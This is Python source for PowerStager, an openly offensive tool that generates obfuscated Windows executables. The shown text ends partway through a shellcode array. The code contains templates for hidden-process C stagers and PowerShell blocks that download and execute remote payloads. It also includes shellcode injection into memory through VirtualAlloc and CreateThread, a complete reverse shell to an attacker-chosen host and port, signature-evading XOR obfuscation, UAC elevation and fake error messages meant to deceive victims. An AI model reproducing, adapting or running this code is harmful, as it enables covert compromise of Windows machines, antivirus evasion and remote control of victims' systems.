#!/usr/bin/env python3
import os
import sys
import getopt
import glob
import socket
import fcntl
import errno
import string
import re
import random
import base64
import time
import datetime
import urllib.parse
import hashlib
import readline
import signal
import names

#*
# TODO :: 
# Add persistence for reverse-shell
#*

# Help notes and description
help_notes = """
  PowerStager 0.2.5
  ---------------
  Created by: z0noxz
  https://github.com/z0noxz/powerstager

  Description:
  This script creates an executable stager that downloads a selected powershell
  payload, loads it into memory and executes it using obfuscated EC methods.
  The script will also bxor the stager for dynamic signatures and some
  additional obfuscation.

  This enables the actual payload to be executed indirectly without the victim
  downloading it, only by executing the stager. The attacker can then for
  example implement evasion techniques on the web server, hosting the payload,
  instead of in the stager itself.

  Additional methods allows the payload to be embedded into the 'stager' and
  temporarily stored encrypted on disk for memory injection.

  Not only are powershell powerful when managing Windows, it's also powerful
  when exploiting Windows. This script exploits multiple Windows features such
  as its inherit trust of powershell, interpretation of shorthand syntaxes,
  code evaluation and more...

  Program dependencies:
  * i686-w64-mingw32-gcc        ([_CHECK_i686_])
  * x86_64-w64-mingw32-gcc      ([_CHECK_x86_64_])
  * i686-w64-mingw32-windres    ([_CHECK_i686_WINDRES_])
  * x86_64-w64-mingw32-windres  ([_CHECK_x86_64_WINDRES_])

  Usage: powerstager [options]

  Options:
    -h, --help                  Show this help message and exit. (duh)

    Method:
    \033[3mOne of these options has to be provided to define the method\033[0m
      -u, --url=URL             Payload URL for online staging
      -p, --path=PATH           Payload path for embedded staging
      -r, --reverse-shell       embedded reverse shell (use netcat or --listener)
                                \033[96m--listener will provide more features\033[0m
      -m, --meterpreter         embedded meterpreter staging (reverse_tcp)
                                \033[96m--path and --meterpreter will dump\033[0m
                                \033[96mthe payload to disk temporary\033[0m

    Mandatory:
      -o, --output=PATH         File output for generated executable
      -t, --target=NAME         Platform target win32/win64

    Reverse Shell:
    \033[3mMandatory options if the reverse-shell method is selected\033[0m
      --lhost=LHOST             Listener host IP address (e.g. 13.37.13.37)
      --lport=LPORT             Listener port (e.g. 4444)

    Meterpreter:
    \033[3mMandatory options if the meterpreter method is selected\033[0m
      --lhost=LHOST             Listener host IP address (e.g. 13.37.13.37)
      --lport=LPORT             Listener port (e.g. 4444)

    Optional:
      --listener                Automatically starts a listener (reverse-shell)
      --obfuscation             Adds an extra layer of obfuscation
      --icon                    Adds an application icon to the executable
      --source-only             Skip compiling and only output c source
      --fake-error="T::C"       Show fake error after execution. Leave blank for default
      -g, --generate            Only outputs the --url ready payload
      -e, --use-elevation       Implementation of privilage elevation (using UAC)
                                \033[96melevation only works with --url\033[0m

  Note:
  \033[91mAll powershell activity will be logged in Windows event log.\033[0m

  Listener Commands:
  \033[3mAll listener commands start with 'Local-'. Listener also features autocomplete using <tab>\033[0m
  \033[3mApart from listener commands exit and clear can also be called\033[0m

  \033[94m[*]\033[0m \033[1m\033[38;5;255mLocal-Invoke\033[0m
      \033[3mInvokes powershell script files from host\033[0m

  \033[94m[*]\033[0m \033[1m\033[38;5;255mLocal-Import-Module\033[0m
      \033[3mImports powershell modules from host\033[0m

  \033[94m[*]\033[0m \033[1m\033[38;5;255mLocal-Set-Width\033[0m
      \033[3mChanges the buffer width on remote client\033[0m

  \033[94m[*]\033[0m \033[1m\033[38;5;255mLocal-Upload\033[0m
      \033[3mUploads files from host\033[0m

  \033[94m[*]\033[0m \033[1m\033[38;5;255mLocal-Download\033[0m
      \033[3mDownloads files from client\033[0m

  \033[94m[*]\033[0m \033[1m\033[38;5;255mLocal-Download-Commands\033[0m
      \033[3mDownloads available powershell commands from client\033[0m

  \033[94m[*]\033[0m \033[1m\033[38;5;255mLocal-Enumerate-System\033[0m
      \033[3mRuns enumeration scripts on client\033[0m

  \033[94m[*]\033[0m \033[1m\033[38;5;255mLocal-Check-Status\033[0m
      \033[3mCollects user and privilage status from client\033[0m

  \033[94m[*]\033[0m \033[1m\033[38;5;255mLocal-Spawn-Meterpreter\033[0m
      \033[3mSpawns meterpreter shells on client\033[0m

  \033[94m[*]\033[0m \033[1m\033[38;5;255mLocal-Spawn-Reverse-Shell\033[0m
      \033[3mSpawns reverse shells on client\033[0m

  \033[94m[*]\033[0m \033[1m\033[38;5;255mLocal-Credential-Create\033[0m
      \033[3mCreates credentials on client\033[0m

  \033[94m[*]\033[0m \033[1m\033[38;5;255mLocal-Credential-List\033[0m
      \033[3mLists created credentials on client\033[0m
"""

windres_manifest_elevation = """
    <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
        <security>
            <requestedPrivileges>
                <requestedExecutionLevel level="requireAdministrator" uiAccess="false"/>
            </requestedPrivileges>
        </security>
    </trustInfo>
"""

windres_manifest = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
    <assemblyIdentity version="1.0.0.0" processorArchitecture="[_RC_ARCHITECTURE_]" name="[_RC_APPLICATION_NAME_]" type="win32"/>
	[_RC_ELEVATION_]
</assembly>
"""

windres_resource = """#include <windows.h>
[_RC_ICON_]

1 24 "[_RC_MANIFEST_FILE_]"
1 VERSIONINFO
FILEVERSION     1,0,0,0
PRODUCTVERSION  1,0,0,0
BEGIN
  BLOCK "StringFileInfo"
  BEGIN
    BLOCK "040904E4"
    BEGIN
      VALUE "CompanyName"		, "[_RC_COMPANY_NAME_]"
      VALUE "FileDescription"	, "[_RC_DESCRIPTION_]"
      VALUE "FileVersion"		, "1.0"
      VALUE "InternalName"		, "[_RC_INTERNAL_NAME_]"
      VALUE "LegalCopyright"	, "[_RC_LEGAL_NAME_]"
      VALUE "OriginalFilename"	, "[_RC_OUTPUT_NAME_]"
      VALUE "ProductName"		, "[_RC_APPLICATION_NAME_]"
      VALUE "ProductVersion"	, "1.0"
    END
  END
  BLOCK "VarFileInfo"
  BEGIN
    VALUE "Translation", 0x409, 1252
  END
END
"""

class Utility(object):

	# Collision list for dynamic variable creation
	collision_list = []
	configuration = {}
	
	@staticmethod
	def remove_encapsulating_quotes(text):
			
		# Primary path strip
		text = text.strip()

		# Remove unwanted quotes
		if text.startswith('"') and text.endswith('"'):
			text = text[1:-1]
		if text.startswith("'") and text.endswith("'"):
			text = text[1:-1]

		# Secondary path strip
		return text.strip()


	@staticmethod
	def get_terminal_width():
		rows, columns = os.popen("stty size", "r").read().split()
		return int(columns)


	# Powershell ready base64 encoder
	@staticmethod
	def ps_base64encode(data):
		return base64.b64encode(data.encode("UTF-16LE")).decode("utf-8", "ignore")


	# Creates dynamic variable names while checking for name collisions
	@staticmethod
	def dynamic_variable():

		holder = ""

		while holder == "" or holder in Utility.collision_list or holder[0].isdigit():
		#	holder = "".join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for x in range(random.randint(6, 12)))
			holder = "".join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for x in range(12))

		Utility.collision_list.append(holder)
		return holder


	# Checks if program is installed and executable
	@staticmethod
	def which(program):

		def is_exe(fpath):
			return os.path.isfile(fpath) and os.access(fpath, os.X_OK)

		fpath, fname = os.path.split(program)
		if fpath:
			if is_exe(program):
				return program
		else:
			for path in os.environ["PATH"].split(os.pathsep):
				path = path.strip('"')
				exe_file = os.path.join(path, program)
				if is_exe(exe_file):
					return exe_file

		return None
	
	
	# Replaces nth occurrence (maybe overkill as the only call is for first occurrence)
	@staticmethod
	def replace_nth(subject, source, target, n):
		indices = [index for index in range(len(subject) - len(source) + 1) if subject[index:index + len(source)] == source]
		if len(indices) < n:
			return subject
		subject = list(subject)
		subject[indices[n - 1]:indices[n - 1] + len(source)] = target
		return "".join(subject)


	# Integer to binary converter
	@staticmethod
	def binary_array_string(n):
		if (n == 0):
			yield 0
		else:
			while n:
				yield n & 0xff
				n = n >> 8
	
	
	@staticmethod
	def local_address_to_binary_array_string(lhost, lport):
		try:
			lhost = lhost.split(".")
			lhost = [int(byte) for byte in lhost]
			lhost = [byte for byte in lhost if byte >= 0 and byte <= 255]
			lport = int(lport)
			if len(lhost) == 4 and lport > 0 and lport <= 65535:
				return (",".join(hex(b) for b in list(Utility.binary_array_string(lport))[::-1]), (",".join(hex(b) for b in (list(Utility.binary_array_string(lhost[0])) + list(Utility.binary_array_string(lhost[1])) + list(Utility.binary_array_string(lhost[2])) + list(Utility.binary_array_string(lhost[3]))))))
		except:
			Print.error("There is something wrong with the LHOST and LPORT")
		sys.exit(2)
						
	
	@staticmethod
	def replace_all(string, target, replacement):

		target		= list(target)
		replacement	= list(replacement)
						
		for i in range(len(target)):
			if (i > (len(replacement) - 1)):
				break
			string = string.replace(target[i], replacement[i])
						
		return string

	@staticmethod
	def load_configuration(configuration):
		Utility.configuration = configuration


	@staticmethod
	def get_configuration_value(name):
		return Utility.configuration[name] if name in Utility.configuration else None


	@staticmethod
	def enum(**enums):
		return type("Enum", (), enums)


	@staticmethod
	def is_url(url):
		return bool(urllib.parse.urlparse(url).scheme)
	

	@staticmethod
	def is_ipv4_address(address):
		try:
			socket.inet_pton(socket.AF_INET, address)
		except AttributeError:
			try:
				socket.inet_aton(address)
			except socket.error:
				return False
			return [x for x in address.split(".") if (len(x) > 0 and x.isdigit() and int(x) >= 0 and int(x) <= 255)] == 4
		except socket.error:
			return False

		return True


# Class for printing and styling text to terminal
class Print(object):

	name_value_list = []

	@staticmethod
	def text(text="", continuous=False):
		if continuous:
			sys.stdout.write("  " + text)
			sys.stdout.flush()
		else:
			print("  " + text)
		return len(text)

	@staticmethod
	def info(text="", continuous=False):
		return Print.text("\033[94m[i]\033[0m " + text, continuous)

	@staticmethod
	def warning(text="", continuous=False):
		return Print.text("\033[96m[!]\033[0m " + text, continuous)

	@staticmethod
	def status(text="", continuous=False):
		return Print.text("\033[94m[*]\033[0m " + text, continuous)

	@staticmethod
	def error(text="", continuous=False):
		return Print.text("\033[91m[-]\033[0m " + text, continuous)

	@staticmethod
	def success(text="", continuous=False):
		return Print.text("\033[92m[+]\033[0m " + text, continuous)
	
	@staticmethod
	def wipe(count=48, back=False):
		return (("\b" * count) if back else "") + (" " * count) + ("\b" * count)

	@staticmethod
	def confirm(text="", yes_is_default=True):
		while True:
			try:
				if yes_is_default:
					return not (input("  \033[38;5;133m[?] " + text + " (Y/n): \033[0m").strip()).lower() in ["n", "no"]
				else:
					return (input("  \033[38;5;133m[?] " + text + " (y/N): \033[0m").strip()).lower() in ["y", "yes"]

			# Catch keyboard interrupt
			except KeyboardInterrupt:
				pass
	
	@staticmethod
	def size(size):
		for unit in ["", "K", "M", "G", "T", "P", "E", "Z"]:
			if abs(size) < 1024.0:
				return "%3.1f %s" % (size, (unit + "B"))
			size /= 1024.0
		return "%.1f%s%s" % (size, "Yi", suffix)
	
	@staticmethod
	def ETA(start, part, total):
		elapsed = (time.time() - start)
		speed = (part / elapsed)		
		eta = ((total - part) / speed)
		
		return "ETA: " + str(datetime.timedelta(seconds=int(eta)))

	@staticmethod
	def add_name_value(name="", value="", func=None):
		Print.name_value_list.append({"name": name, "value": value, "func": func})

	@staticmethod
	def name_value_print():
		for line in Print.name_value_list:
			(line["func"] if line["func"] is not None else Print.text)(line["name"] + (" " * (len(max(Print.name_value_list, key=lambda x: len(x["name"]))["name"]) - len(line["name"]) + 4)) + ": " + line["value"])
		Print.name_value_list = []


obfuscation_type = Utility.enum(
	COMMAND				= 1, 
	ARGUMENT			= 2, 
	MEMBER 				= 3,
	TYPE				= 4,
)


os_target = Utility.enum(
	WIN32				= 32, 
	WIN64				= 64,
)


conf_name = Utility.enum(
	URL					= "url",
	PATH				= "path",
	OUTPUT				= "output",
	TARGET				= "target",
	OBFUSCATION			= "obfuscation",
	REVERSE_SHELL		= "reverse_shell",
	METERPRETER			= "meterpreter",
	ICON				= "icon",
	LHOST				= "lhost",
	LPORT				= "lport",
	LISTENER			= "listener",
	GENERATE			= "generate",
	FAKE_ERROR			= "fake-error",
	SOURCE_ONLY			= "source-only",
	ELEVATION			= "use-elevation",
)


powershell_block = Utility.enum(
	MAIN				= "main",
	BASE64_DECODER		= "base64_decoder",
	XOR_DECRYPTOR		= "xor_decryptor",	
	WEB_CLIENT			= "web_client",
	ENCODED_COMMAND		= "encoded_command",
	MEMORY_INJECTION	= "memory_injection",
	REVERSE_SHELL		= "reverse_shell",
)


shellcode = Utility.enum(
	REVERSE_TCP_64			= "reverse_tcp_64",
	REVERSE_TCP_32			= "reverse_tcp_32",
)

# Placeholder values for powershell blocks with obfuscation techniques
obfuscation = {

	"[_OBF_NEW_OBJECT_]"			: {
										"text"			: "new-object",
										"type"			: obfuscation_type.COMMAND,
									},
	"[_OBF_ADD_TYPE_]"				: {
										"text"			: "add-type",
										"type"			: obfuscation_type.COMMAND,
									},
	"[_OBF_SLEEP_]"					: {
										"text"			: ["start-sleep"],				#["sleep", "start-sleep"],  ## ERROR, aliases cannot be accessed by name using command invokation in windows server 2012
										"type"			: obfuscation_type.COMMAND,
									},
	"[_OBF_GET_ITEM_]"				: {
										"text"			: ["get-item"],					#["gi", "get-item"],  ## ERROR, aliases cannot be accessed by name using command invokation in windows server 2012
										"type"			: obfuscation_type.COMMAND,
									},
	"[_OBF_START_]"					: {
										"text"			: ["start-process"],			#["start", "start-process"],  ## ERROR, aliases cannot be accessed by name using command invokation in windows server 2012
										"type"			: obfuscation_type.COMMAND,
									},
	"[_OBF_INVOKE_EXPRESSION_]"		: {
										"text"			: ["invoke-expression"],		#["iex", "invoke-expression"],  ## ERROR, aliases cannot be accessed by name using command invokation in windows server 2012
										"type"			: obfuscation_type.COMMAND,
									},
	"[_OBF_SV_]"					: {
										"text"			: ["set-variable"],				#["sv", "set-variable"],  ## ERROR, aliases cannot be accessed by name using command invokation in windows server 2012
										"type"			: obfuscation_type.COMMAND,
									},
	"[_OBF_GV_]"					: {
										"text"			: ["get-variable"],				#["gv", "get-variable"],  ## ERROR, aliases cannot be accessed by name using command invokation in windows server 2012
										"type"			: obfuscation_type.COMMAND,
									},
	"[_OBF_INVOKE_COMMAND_]"		: {
										"text"			: "invokecommand",
										"type"			: obfuscation_type.ARGUMENT,
									},
	"[_OBF_UNICODE_]"				: {
										"text"			: "unicode",
										"type"			: obfuscation_type.ARGUMENT,
									},
	"[_OBF_LENGTH_]"				: {
										"text"			: "length",
										"type"			: obfuscation_type.ARGUMENT,
									},
	"[_OBF_VALUE_]"					: {
										"text"			: "value",
										"type"			: obfuscation_type.ARGUMENT,
									},
	"[_OBF_WEB_CLIENT_]"			: {
										"text"			: "net.webclient",
										"type"			: obfuscation_type.ARGUMENT,
									},
	"[_OBF_TEXT_ENCODING_]"			: {
										"text"			: "text.encoding",
										"type"			: obfuscation_type.ARGUMENT,
									},
	"[_OBF_TEXT_ASCII_]"			: {
										"text"			: "text.asciiencoding",
										"type"			: obfuscation_type.ARGUMENT,
									},
	"[_OBF_TEXT_UNICODE_]"			: {
										"text"			: "text.unicodeencoding",
										"type"			: obfuscation_type.ARGUMENT,
									},
	"[_OBF_TCP_CLIENT_]"			: {
										"text"			: "net.sockets.tcpclient",
										"type"			: obfuscation_type.ARGUMENT,
									},
	"[_OBF_DOWNLOAD_STRING_]"		: {
										"text"			: "downloadstring",
										"type"			: obfuscation_type.MEMBER,
									},
	"[_OBF_GET_STREAM_]"			: {
										"text"			: "getstream",
										"type"			: obfuscation_type.MEMBER,
									},
	"[_OBF_TOINT16_]"				: {
										"text"			: "toint16",
										"type"			: obfuscation_type.MEMBER,
									},
	"[_OBF_INVOKE_SCRIPT_]"			: {
										"text"			: "invokescript",
										"type"			: obfuscation_type.MEMBER,
									},
	"[_OBF_GET_BYTES_]"				: {
										"text"			: "getbytes",
										"type"			: obfuscation_type.MEMBER,
									},
	"[_OBF_GET_STRING_]"			: {
										"text"			: "getstring",
										"type"			: obfuscation_type.MEMBER,
									},
	"[_OBF_GET_ENCODING_]"			: {
										"text"			: "getencoding",
										"type"			: obfuscation_type.MEMBER,
									},
	"[_OBF_WRITE_]"					: {
										"text"			: "write",
										"type"			: obfuscation_type.MEMBER,
									},
	"[_OBF_CLEAR_]"					: {
										"text"			: "clear",
										"type"			: obfuscation_type.MEMBER,
									},
	"[_OBF_FLUSH_]"					: {
										"text"			: "flush",
										"type"			: obfuscation_type.MEMBER,
									},
	"[_OBF_CLOSE_]"					: {
										"text"			: "close",
										"type"			: obfuscation_type.MEMBER,
									},
	"[_OBF_TO_STRING_]"				: {
										"text"			: "tostring",
										"type"			: obfuscation_type.MEMBER,
									},
	"[_OBF_TO_B64_STRING_]"			: {
										"text"			: "tobase64string",
										"type"			: obfuscation_type.MEMBER,
									},
	"[_OBF_VIRTUAL_ALLOC_]"			: {
										"text"			: "virtualalloc",
										"type"			: obfuscation_type.MEMBER,
									},
	"[_OBF_MAX_]"					: {
										"text"			: "max",
										"type"			: obfuscation_type.MEMBER,
									},
	"[_OBF_MEMSET_]"				: {
										"text"			: "memset",
										"type"			: obfuscation_type.MEMBER,
									},
	"[_OBF_CREATE_THREAD_]"			: {
										"text"			: "createthread",
										"type"			: obfuscation_type.MEMBER,
									},
	"[_OBF_CHAR_]"					: {
										"text"			: "char",
										"type"			: obfuscation_type.TYPE,
									},
	"[_OBF_BYTE_]"					: {
										"text"			: "byte",
										"type"			: obfuscation_type.TYPE,
									},
	"[_OBF_VOID_]"					: {
										"text"			: "void",
										"type"			: obfuscation_type.TYPE,
									},
	"[_OBF_INTPTR_]"				: {
										"text"			: "intptr",
										"type"			: obfuscation_type.TYPE,
									},
	"[_OBF_CONVERT_]"				: {
										"text"			: "convert",
										"type"			: obfuscation_type.TYPE,
									},
	"[_OBF_NONINTERACTIVE_]"		: {
										"text"			: [[x[:i] for i in range(4,len(x)+1)] for x in ["noninteractive"]][0],
										"type"			: None,
									},
	"[_OBF_NOLOGO_]"				: {
										"text"			: [[x[:i] for i in range(3,len(x)+1)] for x in ["nologo"]][0],
										"type"			: None,
									},
	"[_OBF_NOPROFILE_]"				: {
										"text"			: [[x[:i] for i in range(3,len(x)+1)] for x in ["noprofile"]][0],
										"type"			: None,
									},
	"[_OBF_WINDOWSTYLE_]"			: {
										"text"			: [[x[:i] for i in range(1,len(x)+1)] for x in ["windowstyle"]][0],
										"type"			: None,
									},
	"[_OBF_EXECUTIONPOLICY_]"		: {
										"text"			: [[x[:i] for i in range(2,len(x)+1)] for x in ["executionpolicy"]][0],
										"type"			: None,
									},
	"[_OBF_ARGUMENTLIST_]"			: {
										"text"			: [[x[:i] for i in range(1,len(x)+1)] for x in ["argumentlist"]][0],
										"type"			: None,
									},
	"[_OBF_COMMAND_]"				: {
										"text"			: [[x[:i] for i in range(1,len(x)+1)] for x in ["command"]][0],
										"type"			: None,
									},
	"[_OBF_JOIN_]"					: {
										"text"			: "join",
										"type"			: None,
									},
	"[_OBF_VERB_]"					: {
										"text"			: "verb",
										"type"			: None,
									},
	"[_OBF_PASSTHRU_]"				: {
										"text"			: "passthru",
										"type"			: None,
									},
	"[_OBF_NONEWWINDOW_]"			: {
										"text"			: "nonewwindow",
										"type"			: None,
									},
	"[_OBF_SPLIT_]"					: {
										"text"			: "split",
										"type"			: None,
									},
	"[_OBF_BXOR_]"					: {
										"text"			: "bxor",
										"type"			: None,
									},
	"[_OBF_HIDDEN_]"				: {
										"text"			: "hidden",
										"type"			: None,
									},
	"[_OBF_RUNAS_]"					: {
										"text"			: "runas",
										"type"			: None,
									},
	"[_OBF_BYPASS_]"				: {
										"text"			: "bypass",
										"type"			: None,
									},
	"[_OBF_EXECUTIONCONTEXT_]"		: {
										"text"			: "executioncontext",
										"type"			: None,
									},
	"[_OBF_AS_]"					: {
										"text"			: "as",
										"type"			: None,
									},
	"[_OBF_POWERSHELL_]"			: {
										"text"			: "powershell",
										"type"			: None,
									},
	"[_OBF_CMD_]"					: {
										"text"			: "cmd",
										"type"			: None,
									},
}

c_source_mb = """
	MessageBox(NULL,\"[_VAL_MB_CONTENT_]\",\"[_VAL_MB_TITLE_]\",MB_ICONERROR|MB_OK);
	return 1;
"""

# Normal C source for decryption and process execution through system() call
c_source = """#include <stdlib.h>
#include <windows.h>

int WINAPI WinMain(
	HINSTANCE	hInstance,
	HINSTANCE	hPrevInstance,
	LPTSTR		lpCmdLine,
	int			cmdShow
	)
{
	STARTUPINFO [_VAR_SI_];
	PROCESS_INFORMATION [_VAR_PI_];

	memset(&[_VAR_SI_], 0, sizeof([_VAR_SI_]));
	[_VAR_SI_].cb = sizeof(STARTUPINFO);
	[_VAR_SI_].dwFlags = STARTF_USESHOWWINDOW;
	[_VAR_SI_].wShowWindow = SW_HIDE;

	int [_VAR_X_];
	char [_VAR_STR_][] = {[_VAL_STR_]};
	char [_VAR_KEY_][] = {[_VAL_KEY_]};
	for ([_VAR_X_] = 0; [_VAR_X_] < sizeof([_VAR_STR_]) / sizeof([_VAR_STR_][0]); [_VAR_X_]++)
	{
		[_VAR_STR_][[_VAR_X_]] = [_VAR_STR_][[_VAR_X_]] ^ [_VAR_KEY_][[_VAR_X_] % sizeof([_VAR_KEY_])];
	}

	CreateProcess(
		NULL, 
		[_VAR_STR_], 
		NULL, 
		NULL, 
		FALSE, 
		CREATE_NO_WINDOW, 
		NULL, 
		NULL, 
		&[_VAR_SI_], 
		&[_VAR_PI_]
	);
	
	[_MB_]
}
"""

# C source for XOR decryption and process execution of embedded code through system() call
c_source_embedded = """#define _CRT_SECURE_NO_DEPRECATE
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

int WINAPI WinMain(
	HINSTANCE	hInstance,
	HINSTANCE	hPrevInstance,
	LPTSTR		lpCmdLine,
	int			cmdShow
	)
{
	STARTUPINFO [_VAR_SI_];
	PROCESS_INFORMATION [_VAR_PI_];

	memset(&[_VAR_SI_], 0, sizeof([_VAR_SI_]));
	[_VAR_SI_].cb = sizeof(STARTUPINFO);
	[_VAR_SI_].dwFlags = STARTF_USESHOWWINDOW;
	[_VAR_SI_].wShowWindow = SW_HIDE;
	
	int [_VAR_X_];
	char [_VAR_PATH_][256];
	const char* [_VAR_TEMP_] = getenv("TEMP");
	snprintf([_VAR_PATH_], 255, "%s\\\\[_TMP_FILENAME_]", [_VAR_TEMP_]);

	FILE *[_VAR_FILE_] = fopen([_VAR_PATH_], "wb");
	if ([_VAR_FILE_] == NULL) { exit(1); }

	char [_VAR_STR_EMB_][] = {[_VAL_STR_EMB_]};
	char [_VAR_KEY_EMB_][] = {[_VAL_KEY_EMB_]};
	for ([_VAR_X_] = 0; [_VAR_X_] < sizeof([_VAR_STR_EMB_]) / sizeof([_VAR_STR_EMB_][0]); [_VAR_X_]++)
	{
		[_VAR_STR_EMB_][[_VAR_X_]] = [_VAR_STR_EMB_][[_VAR_X_]] ^ [_VAR_KEY_EMB_][[_VAR_X_] % sizeof([_VAR_KEY_EMB_])];
	}

	fwrite([_VAR_STR_EMB_], 1, sizeof([_VAR_STR_EMB_]), [_VAR_FILE_]);
	fclose([_VAR_FILE_]);

	char [_VAR_STR_STG_][] = {[_VAL_STR_STG_]};
	char [_VAR_KEY_STG_][] = {[_VAL_KEY_STG_]};
	for ([_VAR_X_] = 0; [_VAR_X_] < sizeof([_VAR_STR_STG_]) / sizeof([_VAR_STR_STG_][0]); [_VAR_X_]++)
	{
		[_VAR_STR_STG_][[_VAR_X_]] = [_VAR_STR_STG_][[_VAR_X_]] ^ [_VAR_KEY_STG_][[_VAR_X_] % sizeof([_VAR_KEY_STG_])];
	}

	CreateProcess(
		NULL, 
		[_VAR_STR_STG_], 
		NULL, 
		NULL, 
		FALSE, 
		CREATE_NO_WINDOW, 
		NULL, 
		NULL, 
		&[_VAR_SI_], 
		&[_VAR_PI_]
	);

	[_MB_]
}
"""

# Fairly obfuscated building blocks for powershell commands
powershell_blocks = {

	# Main
	powershell_block.MAIN
	: "[_OBF_POWERSHELL_] -[_OBF_WINDOWSTYLE_] [_OBF_HIDDEN_] -[_OBF_COMMAND_] \"[_PS_LOAD_]\"",
	
	# Base64 decoder
	powershell_block.BASE64_DECODER
	: "([[_OBF_CONVERT_]]::[_OBF_TO_B64_STRING_]([Text.Encoding]::[_OBF_UNICODE_].[_OBF_GET_BYTES_]([_PS_LOAD_])))",

	# XOR decryptor
	powershell_block.XOR_DECRYPTOR
	: "([[_OBF_CHAR_][]](([[_OBF_CHAR_][]][_PS_LOAD_])|%{$[_PS_XOR_I_]=0}{$_-[_OBF_BXOR_]'[_PS_XOR_KEY_]'[$[_PS_XOR_I_]++%[_PS_XOR_KEY_SIZE_]]})-[_OBF_JOIN_]'')",

	# System.Net.WebClient
	powershell_block.WEB_CLIENT
	: "([_OBF_NEW_OBJECT_] [_OBF_WEB_CLIENT_]).[_OBF_DOWNLOAD_STRING_]([_URL_])",

	# Encoded command
	powershell_block.ENCODED_COMMAND
	: "[_OBF_SV_] [_PS_VAR_1_] [_PS_VAR_C45_A_];[_OBF_SV_] [_PS_VAR_2_] [_PS_VAR_C101_A_];[_OBF_SV_] [_PS_VAR_3_] [_PS_VAR_C99_A_];[_OBF_SV_] [_PS_VAR_4_](((([_OBF_GV_] [_PS_VAR_1_]).[_OBF_VALUE_]+[_PS_VAR_C45_B_])-[_OBF_AS_][[_OBF_CHAR_]]).[_OBF_TO_STRING_]()+((([_OBF_GV_] [_PS_VAR_2_]).[_OBF_VALUE_]+[_PS_VAR_C101_B_])-[_OBF_AS_][[_OBF_CHAR_]]).[_OBF_TO_STRING_]()+((([_OBF_GV_] [_PS_VAR_3_]).[_OBF_VALUE_]+[_PS_VAR_C99_B_])-[_OBF_AS_][[_OBF_CHAR_]]).[_OBF_TO_STRING_]());[_OBF_POWERSHELL_] -[_OBF_NONINTERACTIVE_] -[_OBF_NOLOGO_] -[_OBF_NOPROFILE_] -[_OBF_WINDOWSTYLE_] [_OBF_HIDDEN_] -[_OBF_EXECUTIONPOLICY_] [_OBF_BYPASS_] ([_OBF_GV_] [_PS_VAR_4_]).[_OBF_VALUE_].[_OBF_TO_STRING_]()[_PS_LOAD_]",

	# Memory injection
	powershell_block.MEMORY_INJECTION
	: "$[_PS_WF_]=[_OBF_ADD_TYPE_] -m '[DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")] public static extern IntPtr memset(IntPtr dest, uint src, uint count);' -name 'Win32' -ns Win32Functions -pas;[[_OBF_BYTE_][]]$[_PS_VAR_PAYLOAD_]=[_PS_PAYLOAD_];$[_PS_VAR_X_]=$[_PS_WF_]::[_OBF_VIRTUAL_ALLOC_](0,[Math]::[_OBF_MAX_]($[_PS_VAR_PAYLOAD_].[_OBF_LENGTH_],0x1000),0x3000,0x40);for($[_PS_VAR_I_]=0;$[_PS_VAR_I_] -le ($[_PS_VAR_PAYLOAD_].[_OBF_LENGTH_]-1);$[_PS_VAR_I_]++){[[_OBF_VOID_]]$[_PS_WF_]::[_OBF_MEMSET_]([[_OBF_INTPTR_]]($[_PS_VAR_X_].ToInt[_PS_ARCHITECTURE_]()+$[_PS_VAR_I_]),$[_PS_VAR_PAYLOAD_][$[_PS_VAR_I_]],1)};$[_PS_WF_]::[_OBF_CREATE_THREAD_](0,0,$[_PS_VAR_X_],0,0,0);[_OBF_SLEEP_] 100000",

	# Reverse powershell
	powershell_block.REVERSE_SHELL
	: "$[_PS_VAR_ASCII_]=([_OBF_NEW_OBJECT_] [_OBF_TEXT_ASCII_]);$[_PS_VAR_UNICODE_]=[text.encoding]::[_OBF_GET_ENCODING_]('iso-8859-1');$[_PS_VAR_CLIENT_]=[_OBF_NEW_OBJECT_] [_OBF_TCP_CLIENT_]('[_LHOST_]',[_LPORT_]);$[_PS_VAR_STREAM_]=$[_PS_VAR_CLIENT_].[_OBF_GET_STREAM_]();$[_PS_VAR_SEND_]=$[_PS_VAR_UNICODE_].[_OBF_GET_BYTES_](\"Windows PowerShell`nrunning as \"+$env:username+\"@\"+$env:computername+\"`n`nPS \"+(Get-Location).Path+\">\");$[_PS_VAR_STREAM_].[_OBF_WRITE_]($[_PS_VAR_SEND_],0,$[_PS_VAR_SEND_].[_OBF_LENGTH_]);[[_OBF_BYTE_][]]$[_PS_VAR_BYTES_]=0..1024|%{0};while(($[_PS_VAR_I_]=$[_PS_VAR_STREAM_].Read($[_PS_VAR_BYTES_],0,$[_PS_VAR_BYTES_].[_OBF_LENGTH_])) -ne 0){$[_PS_VAR_SEND_]=$[_PS_VAR_UNICODE_].[_OBF_GET_BYTES_]((iex ($[_PS_VAR_UNICODE_].[_OBF_GET_STRING_]($[_PS_VAR_BYTES_],0,$[_PS_VAR_I_])) 2>&1|Out-String)+(&{If($error[0]){(\"exception ::`n\"+($error[0]|Out-String)+\"`n:: exception`n\")}else{''}})+\"PS \"+(Get-Location).Path+\"> \");$error.[_OBF_CLEAR_]();$[_PS_VAR_STREAM_].[_OBF_WRITE_]($[_PS_VAR_SEND_],0,$[_PS_VAR_SEND_].[_OBF_LENGTH_]);$[_PS_VAR_STREAM_].[_OBF_FLUSH_]();}$[_PS_VAR_CLIENT_].[_OBF_CLOSE_]();",
}

# Payloads prepared for memory injection
shellcodes = {
	
	# reverse_tcp stager stager for metasploit.
	shellcode.REVERSE_TCP_64
	: "0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,"
	+ "0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,"
